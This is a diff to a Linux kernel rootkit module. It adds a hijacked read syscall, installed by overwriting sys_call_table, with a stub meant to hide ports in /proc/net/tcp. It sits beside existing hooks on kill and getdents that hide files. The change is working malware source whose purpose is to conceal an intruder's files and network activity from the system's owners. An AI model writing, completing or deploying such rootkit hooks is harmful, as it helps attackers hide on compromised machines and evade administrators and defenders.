@@ -183,6 +183,39 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	return result;
 }
 
+typedef asmlinkage int (*read_ptr)(unsigned int fd, char *buf,
+                                   unsigned int count);
+read_ptr orig_read;
+
+asmlinkage int hacked_read(unsigned int fd, char *buf,
+                           unsigned int count)
+{
+	int result;
+	char *kbuf;
+
+	// run real read 
+	result = (*orig_read)(fd,buf,count);
+
+	// copy from user to kernelspace;
+	if (!access_ok(VERIFY_READ,buf,result))
+		return -1;
+	if ((kbuf = kmalloc(result,GFP_KERNEL)) == NULL)
+		return -1;
+	if (copy_from_user(kbuf,buf,result))
+		return -1;
+
+	// filter out hidden ports if reading /proc/net/tcp
+
+	// copy from kernel to userspace
+	if (!access_ok(VERIFY_WRITE,buf,result))
+		return -1;
+	if (copy_to_user(buf,kbuf,result))
+		return -1;
+	kfree(kbuf);
+
+	// return number of bytes read
+	return result;
+}
 int rootkit_init(void) {
 	GPF_DISABLE;
 
@@ -194,6 +227,9 @@ int rootkit_init(void) {
 
 	orig_getdents64 = (getdents64_ptr)sys_call_table[__NR_getdents64];
 	sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
+
+	orig_read = (read_ptr)sys_call_table[__NR_read];
+	sys_call_table[__NR_read] = (unsigned long) hacked_read;
 
 	GPF_ENABLE;
 	printk(KERN_INFO "Loading rootkit\n");
@@ -207,6 +243,7 @@ void rootkit_exit(void) {
 	sys_call_table[__NR_kill] = (unsigned long) orig_kill;
 	sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
 	sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
+	sys_call_table[__NR_read] = (unsigned long) orig_read;
 	GPF_ENABLE;
 
 	list_for_each_entry_safe(ptr,next,&hidden_files,list) {
